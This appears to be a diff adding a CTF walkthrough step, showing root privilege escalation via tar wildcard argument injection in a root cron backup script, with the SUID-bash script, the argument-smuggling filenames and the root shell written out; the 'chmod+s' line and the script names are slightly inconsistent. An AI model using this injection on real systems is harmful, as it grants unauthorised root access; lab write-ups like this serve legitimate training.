@@ -463,3 +463,38 @@ Explore:
     52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
     #
 
+The `backup.sh` script in `/home/milesdyson/backups` uses the `tar` command-line tool to archive the contents of 
+the web application stored in `/var/www/html` and place the backups in the backup folder. The script is executed 
+by root every minute.
+
+Acoording to [GTFOBins tar](https://gtfobins.github.io/gtfobins/tar/), tar can be exploited when running as 
+root (sudo):
+
+    tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+Tar has an argument called `–checkpoint`, which displays a "progress" message every time n number of files have 
+been archived. This can be used in concatenation with the `–checkpoint-action` flag, which executes an action, 
+in the form of a binary or script, whenever a checkpoint is reached.
+
+The wildcard used in the script will execute a given command against all files and folders in the `/var/www/html` 
+directory, and this can be exploited by adding a `–checkpoint=1` file (to enable the checkpoint function) and a 
+`–checkpoint-action=exec=/tmp/hack.sh` file (to specify the action to perform) which will be effectively treated 
+as arguments when tar comes across them.
+
+Create a `bash` script which will create SUID binary of bash, naming it `shell.sh`:
+
+```text
+#!/bin/bash
+cp /bin/bash /tmp/shell && chmod+s /tmp/shell
+```
+
+In `tmp`, execute the commands to create the two files (arguments) for `tar`:
+
+    touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+    touch "/var/www/html/--checkpoint=1"
+
+After `cron` has run and has created the shell SUID copy of bash, execute it with the `-p` flag:
+
+    $ /tmp/shell -p
+    # whoami
+    root
